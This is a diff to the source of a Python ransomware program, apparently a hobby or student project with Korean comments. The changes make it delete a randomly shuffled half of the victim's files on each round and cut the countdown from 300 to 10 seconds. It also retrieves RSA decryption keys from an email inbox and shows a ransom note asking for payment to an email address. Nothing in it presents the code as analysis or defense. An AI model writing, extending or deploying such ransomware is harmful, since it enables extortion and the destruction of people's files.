@@ -5,6 +5,7 @@ from Crypto.PublicKey import RSA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 import os
+import random
 import threading
 from time import sleep
 
@@ -81,13 +82,10 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.pack()
 
     sleep(2)
+    random.shuffle(remove_filelist)
 
     if (len(remove_filelist) >= 2):
-        n = 0
-        if (len(remove_filelist) % 2 == 0):
-            n = round(len(remove_filelist) / 2)
-        else:
-            n = round(len(remove_filelist) / 2) - 1
+        n = len(remove_filelist) // 2
         for i in range(n):
             os.remove(remove_filelist[i])
 
@@ -219,7 +217,7 @@ class MyTk:
                                          "\nIf you send money, send an e-mail with your account at this address."
                                          "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
                                          "\nEvery hour half of all files will be deleted."
-                                         "\n--WARNING--"
+                                         "\n------WARNING------"
                                          "\nDo not force-terminate this program."
                                          "\nYou will NEVER decrypt your files."
                                          "\n",
@@ -334,7 +332,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 300, antdd_filelist)
+    clock(gui, 10, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -440,11 +438,11 @@ class RealMain:
         # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
         for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
-            #text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
-            #idx = text.find('Subject:')
-            #text = text[idx + 9:]
-            #uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
-            #key = text[42:]  # 메일에 들어있는 해당 주소의 private key
+            # text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
+            # idx = text.find('Subject:')
+            # text = text[idx + 9:]
+            # uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
+            # key = text[42:]  # 메일에 들어있는 해당 주소의 private key
             uuid = msg[12].decode()[msg[12].decode().find(':') + 2:]
             key = b'\n'.join(msg[15:]).decode()
 
@@ -464,6 +462,7 @@ class RealMain:
                         dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
                     self.myGui.finalGui()
+                    self.myGui.window.destroy()
 
 
 if __name__ == "__main__":
